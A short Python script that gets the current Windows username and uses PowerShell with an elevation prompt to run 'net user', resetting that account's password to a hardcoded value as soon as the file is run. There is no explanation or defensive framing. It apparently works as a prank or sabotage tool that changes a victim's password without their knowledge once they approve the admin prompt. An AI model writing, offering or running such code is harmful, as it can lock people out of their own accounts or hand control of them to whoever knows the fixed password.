import os 
import subprocess

def password():
    name = os.getlogin()

    command = f"net user {name} 467925"

    subprocess.run(f"powershell Start-Process cmd -Argumentlist '/C {command}' -Verb runAs  ", shell=True)


password()
